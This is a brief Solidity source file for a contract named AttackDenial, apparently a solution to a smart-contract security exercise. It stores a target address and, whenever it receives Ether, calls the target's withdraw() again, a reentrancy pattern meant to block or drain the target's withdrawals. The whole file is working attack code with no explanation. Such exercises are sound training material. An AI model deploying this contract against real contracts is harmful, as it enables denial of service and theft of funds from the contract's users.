// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackDenial{
    constructor(address _denial) public {
        denial = _denial;
    }

    address denial;

    receive() external payable {
        (bool success,) = address(denial).call(abi.encodeWithSignature("withdraw()"));
        require(success, "Call failed");
    }
}